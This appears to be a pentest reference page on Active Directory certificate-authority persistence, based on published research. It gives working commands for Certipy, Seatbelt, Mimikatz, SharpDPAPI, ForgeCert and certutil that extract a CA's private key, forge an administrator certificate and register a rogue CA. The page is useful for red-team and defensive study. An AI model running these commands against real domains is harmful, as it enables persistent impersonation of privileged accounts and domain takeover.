## Theory
In the research [papers](https://posts.specterops.io/certified-pre-owned-d95910965cd2), Will Schroeder and Lee Christensen identified 2 domain persistence techniques relying on the role of the Certificate Authority within a PKI.

- Forging certificates with a stolen CA certificates (DPERSIST1)
- Trusting rogue CA certificates (DPERSIST2)
## Exploit
### Stolen CA
If an attacker obtains control over a CA server, he may be able to retrieve the private key associated with the CA cert, and use that private key to generate and sign client certificates. This means he could forge (and sign) certificate to authenticate as a powerful user for example.
=== "UNIX-like"
    Extracting the DPAPI-protected CA cert private key can be done remotely from UNIX-like systems with Certipy (Python).
    ```bash
    certipy ca -backup -ca "CA" -username "USER@domain.local" -password "PASSWORD" -dc-ip "DC-IP"
    ```
    Then, forging (and signing) a certificate can be done as follows.
    ```bash
    certipy forge -ca-pfx "CA.pfx" -upn "administrator@corp.local" -subject "CN=Administrator,CN=Users,DC=CORP,DC=LOCAL"
    ```
    The certificate can then be used with Pass the Certificate.
=== "Windows"
    Extracting the DPAPI-protected CA cert private key can be done remotely with [Seatbelt](https://github.com/GhostPack/Seatbelt) (C#).
    ```bash
    Seatbelt.exe Certificates -computername="ca.domain.local"
    ```
    Alternatively, the builtin `certsrv.msc` utility can be used locally on the CA server.
    ```bash
    Win+R > certsrv.msc > CA > right click > All Tasks > Back up CA... > selet "Private key and CA certificate" > Next
    ```
    Alternatively, Mimikatz (C) can also be used for that purpose, locally.
    ```bash
    mimikatz.exe "crypto::capi" "crypto::cng" "crypto::certificates /export"
    ```
    Alternatively, SharpDPAPI (C#) can be used for that purpose, locally, along with openssl to transform the PEM into a usable PFX.
    ```bash
    SharpDPAPI.exe certificates /machine
    ```
    ```bash
    openssl pkcs12 -in "ca.pem" -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "ca.pfx"
    ```
    Then, forging and signing a certificate can be done with [ForgeCert](https://github.com/GhostPack/ForgeCert) (C#).
    ```bash
    ForgeCert.exe --CaCertPath "ca.pfx" --CaCertPassword "Password" --Subject "CN=User" --SubjectAltName "administrator@domain.local" --NewCertPath "administrator.pfx" --NewCertPassword "Password"
    ```
### Rogue CA
An attacker with sufficient privileges in the domain can setup a rogue CA and make the domain's resources trust it. Once the rogue CA is trusted, the attacker can forge and sign client certificates.

In order to register the rogue CA, the self-signed CA cert must be added to the `NTAuthCertificates` object's `cacertificate` attribute, and in the RootCA directory services store.

Registering the rogue CA can be done remotely with the certutil.exe utility from Windows systems.
```bash
certutil.exe -dspublish -f "C:\Temp\CERT.crt" NTAuthCA
```
Once this is done, a certificate can be forged, signed and used as explained above